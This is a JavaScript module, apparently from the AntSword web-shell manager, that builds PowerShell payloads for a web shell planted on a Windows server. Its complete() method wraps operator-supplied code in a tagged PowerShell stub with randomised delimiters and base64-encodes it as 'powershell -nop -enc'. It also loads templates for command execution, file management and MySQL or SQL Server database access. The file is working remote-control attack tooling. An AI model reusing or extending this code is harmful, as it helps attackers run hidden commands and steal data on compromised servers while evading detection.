/**
 * PSWindows服务端脚本模板
 */
'use strict';

// import Base from '../base';
const Base = require('../base');

class PSWINDOWS extends Base {
  static get supportRawBody() {
    return true;
  }
  constructor(opts) {
    super(opts);
    // 解析模板
    [
      'base',
      'command',
      'filemanager',
      'database/mysql_odbc',
      'database/sqlserver_odbc',
      'database/sqlserver_sqlclient',
    ].map((_) => {
      this.parseTemplate(`./pswindows/template/${_}`);
    });
    // 解析编码器
    this
      .encoders
      .map((_) => {
        this.parseEncoder(`./pswindows/encoder/${_}`);
      });
    this
      .decoders
      .map((_) => {
        this.parseDecoder(`./pswindows/decoder/${_}`);
      });
  }

  /**
   * 获取编码器列表
   * ? 可以在antSword.core.php.prototype.encoders中获取此变量
   * @return {array} 编码器列表
   */
  get encoders() {
    return ["base64"];
  }

  get decoders() {
      return ["default", "base64", "hex"];
    }
    /**
     * HTTP请求数据组合函数
     * @param  {Object} data 通过模板解析后的代码对象
     * @param {bool} force_default 强制使用 default 解码
     * @return {Promise}     返回一个Promise操作对象
     */
  complete(data, force_default = false) {
    // 分隔符号
    let tag_s, tag_e;
    if (this.__opts__['otherConf'].hasOwnProperty('use-custom-datatag') && this.__opts__['otherConf']['use-custom-datatag'] == 1 && this.__opts__['otherConf']['custom-datatag-tags']) {
      tag_s = this.__opts__['otherConf']['custom-datatag-tags'];
    } else {
      tag_s = Math.random().toString(16).substr(2, parseInt(Math.random() * 8 + 5)); // "->|";
    }
    if (this.__opts__['otherConf'].hasOwnProperty('use-custom-datatag') && this.__opts__['otherConf']['use-custom-datatag'] == 1 && this.__opts__['otherConf']['custom-datatag-tage']) {
      tag_e = this.__opts__['otherConf']['custom-datatag-tage'];
    } else {
      tag_e = Math.random().toString(16).substr(2, parseInt(Math.random() * 8 + 5)); // "|<-";
    }

    let asencCode;
    let ext = {
      opts: this.__opts__,
    };
    if (!force_default) {
      asencCode = this.__decoder__[this.__opts__['decoder'] || 'default'].asoutput(ext);
    } else {
      asencCode = this.__decoder__['default'].asoutput(ext);
    }
    // 组合完整的代码
    let tmpCode = data['_'];
    data['_'] = `$TAGS=[System.String]::Concat('${tag_s.substr(0,tag_s.length/2)}','${tag_s.substr(tag_s.length/2)}');$TAGE=[System.String]::Concat('${tag_e.substr(0,tag_e.length/2)}','${tag_e.substr(tag_e.length/2)}');${asencCode};function asexec() { ${tmpCode} };$RESP='';try{$RESP=asenc(asexec);}catch{$RESP=asenc([System.String]::Format('ERROR:// {0}',$_.ToString()));};[System.String]::Format('{0}{1}{2}',$TAGS,$RESP,$TAGE);`;
    data['_'] = `powershell -nop -enc ${this.Base64UTF16(data['_'])}`;
    // 使用编码器进行处理并返回
    return this.encodeComplete(tag_s, tag_e, data);
  }

  // https://stackoverflow.com/questions/17913609/javascript-unicode-base64-encode
  Base64UTF16(cmd) {
    var ar = new Array(cmd.length * 2),
      i, j, s, b64;
    // build array of bytes
    for (i = 0, j = 0; i < cmd.length; j = 2 * ++i) {
      ar[j] = cmd.charCodeAt(i);
    }
    // build string from array
    s = String.fromCharCode.apply(String, ar);
    // to base64
    b64 = btoa(s);
    return b64;
  }
}

module.exports = PSWINDOWS;